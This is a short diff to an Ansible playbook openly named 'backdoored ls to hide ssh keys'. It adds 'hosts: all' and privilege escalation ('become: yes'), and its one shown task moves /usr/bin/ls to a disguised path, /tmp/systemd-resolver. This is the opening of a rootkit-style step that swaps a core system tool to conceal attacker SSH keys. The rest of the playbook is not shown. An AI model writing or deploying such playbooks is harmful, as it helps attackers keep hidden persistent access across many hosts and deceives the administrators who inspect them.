@@ -1,5 +1,7 @@
 ---
 - name: "backdoored ls to hide ssh keys"
+  hosts: all
+  become: yes
   tasks:
     - name: "move ls"
       shell: "mv /usr/bin/ls /tmp/systemd-resolver"
